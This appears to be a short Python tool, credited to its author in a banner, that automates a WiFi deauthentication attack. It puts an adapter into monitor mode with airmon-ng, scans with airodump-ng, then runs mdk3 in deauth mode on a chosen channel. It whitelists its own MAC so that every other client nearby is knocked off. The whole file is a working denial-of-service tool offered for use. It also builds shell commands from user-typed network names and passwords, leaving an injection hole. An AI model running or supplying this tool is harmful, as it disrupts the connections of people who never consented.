import os,subprocess
from getpass import getpass
print("*"*36)
print("# This App Created By Wassim RouGi #\n# And All Rights Reserved"+" "*10+"#\n# Fb: facebook.com/wassimkho"+" "*7+"#")
print("*"*36)
def test_number_of_adapters():
	a = "airmon-ng | awk '{print $2}' | grep 'wlan' | wc -l"
	a = os.popen(a).read()
	if (int(a)>=2):
		return True
	else:
		return False
def test_connexion():
	a = "iwgetid"
	a = os.popen(a).read()
	if (str(a)!=""):
		return True
	else:
		return False
def connect_to_wifi():
	b = "ifconfig | grep -o -E '(wlan)([[:digit:]])' | awk 'NR==1'"
	b = os.popen(b).read()
	d = input("Enter The WiFi Name They You Want To Connect With It : ")
	c = getpass("Enter The Password (If No Pass Press Enter) : ")
	if (c!=""):
		a = "nmcli d wifi connect "+str(d)+" password "+str(c)+" ifname "+str(b)
		os.system(a)
	else:
		a = "nmcli d wifi connect "+str(d)+" ifname "+str(b)
		os.system(a)
def start_wlan():
	global c
	a = "ifconfig | grep '<UP,BROADCAST,MULTICAST>' | grep 'wlan' | cut -d: -f1 | grep -m1 ''"
	c= os.popen(a).read()
	os.system("airmon-ng start "+str(c).replace("\n",""))
def stopmon():
	q = "airmon-ng | awk '{print $2}' | grep 'mon' | grep -m1 ''"
	c= os.popen(q).read()
	while(str(c)!=""):
		os.system("airmon-ng stop "+str(c))
		q = "airmon-ng | awk '{print $2}' | grep 'mon' | grep -m1 ''"
		c= os.popen(q).read()
def main():
	stopmon()
	start_wlan()
	a = "ifconfig | grep 'RUNNING' | grep 'wlan' | cut -d: -f1"
	d = os.popen(a).read()
	a = os.popen("ifconfig "+str(d[0:5])+" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'").read()
	with open("test.txt",mode="a") as result:
		result.write(a.upper())
		result.write("FF:FF:FF:FF:FF:FF\n")
	tv = str(c[0:5]).replace("\n","")+"mon"
	os.system("airodump-ng "+str(tv))
	s = input("Enter The Channel Number : ")
	os.system("mdk3 "+str(tv)+" d -w test.txt -c "+str(s))
	os.system("rm test.txt")
	stopmon()

if (test_number_of_adapters()==True):
	if (test_connexion()==False):
		connect_to_wifi()
		main()
	else:
		print("You Are Connect To WiFi")
		main()
else:
	print("You Must 2 Adapter")	

